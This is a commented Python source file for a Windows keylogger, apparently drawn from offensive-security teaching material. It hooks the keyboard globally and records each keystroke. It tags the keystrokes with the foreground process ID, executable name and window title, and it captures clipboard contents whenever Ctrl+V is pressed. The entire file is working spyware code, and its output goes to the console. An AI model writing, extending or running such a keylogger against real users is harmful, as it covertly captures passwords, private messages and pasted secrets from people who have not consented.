from ctypes import *  # Import ctypes for interacting with Windows API

import pyHook  # Import pyHook for keyboard event hooking
import pythoncom  # Import pythoncom for COM message pumping
import win32clipboard  # Import win32clipboard for clipboard operations

# Load Windows DLLs for API calls
user32 = windll.user32  # User32.dll for window handling
kernel32 = windll.kernel32  # Kernel32.dll for process handling
psapi = windll.psapi  # Psapi.dll for process module information
current_window = None  # Global variable to track the current window


def get_current_process():
    """
    Retrieves and prints information about the current foreground process.
    """
    # Get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # Find the process ID
    pid = c_ulong(0)  # Initialize a ctypes unsigned long for PID
    user32.GetWindowThreadProcessId(hwnd, byref(pid))  # Get PID from window handle

    # Store the process ID as a string
    process_id = "%d" % pid.value

    # Get the executable name
    executable = create_string_buffer(b'\x00' * 512)  # Buffer for executable name
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)  # Open process with query and read access

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)  # Retrieve executable name

    # Get the window title
    window_title = create_string_buffer(b'\x00' * 512)  # Buffer for window title
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)  # Retrieve window title

    # Print process information
    print()
    print("[ PID: %s - %s - %s ]" % (process_id,
                                     executable.value,
                                     window_title.value)
          )
    print()

    # Close handles to free resources
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    """
    Handles keyboard events, logs key presses, and detects clipboard paste actions.
    """
    global current_window  # Reference global variable to track window changes

    # Check if the active window has changed
    if event.WindowName != current_window:
        current_window = event.WindowName  # Update current window
        get_current_process()  # Log new process information

    # Handle standard ASCII key presses (printable characters)
    if 32 < event.Ascii < 127:
        print(chr(event.Ascii), end=' ')  # Print the character
    else:
        # Handle Ctrl+V for clipboard paste
        if event.Key == "V":
            win32clipboard.OpenClipboard()  # Open the clipboard
            pasted_value = win32clipboard.GetClipboardData()  # Get clipboard data
            win32clipboard.CloseClipboard()  # Close the clipboard
            print("[PASTE] - %s" % pasted_value, end=' ')  # Print pasted content
        else:
            print("[%s]" % event.Key, end=' ')  # Print non-printable key name

    # Allow the event to pass to the next registered hook
    return True


# Create and configure the hook manager
kl = pyHook.HookManager()  # Initialize hook manager
kl.KeyDown = KeyStroke  # Assign KeyStroke function to handle key down events

# Register the keyboard hook and run the message loop indefinitely
kl.HookKeyboard()  # Hook the keyboard
pythoncom.PumpMessages()  # Process messages to keep the hook active
